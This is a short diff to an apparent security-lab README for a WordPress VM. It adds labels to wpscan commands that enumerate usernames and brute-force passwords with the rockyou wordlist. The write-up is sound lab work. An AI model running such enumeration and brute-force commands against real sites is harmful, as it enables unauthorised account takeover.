@@ -17,8 +17,9 @@ Time spent: **X** hours spent in total
   - Commands used:<br />
   sudo gunzip /usr/share/wordlists/rockyou.txt.gz (extract and move for ease of use)
   <br /> wpscan --url http://wpdistillery.vm
-  <br /> wpscan --url http://wpdistillery.vm --enumerate u 
-  <br /> wpscan --url http://wpdistillery.vm -U ~/Desktop/wpusers.txt -P ~/Desktop/rockyou.txt
+  <br /> wpscan --url http://wpdistillery.vm --enumerate u (Finding Usernames)
+  <br /> wpscan --url http://wpdistillery.vm -U ~/Desktop/wpusers.txt -P ~/Desktop/rockyou.txt (BruteForce Attack)
+  
 
 
 - [ ] GIF Walkthrough:
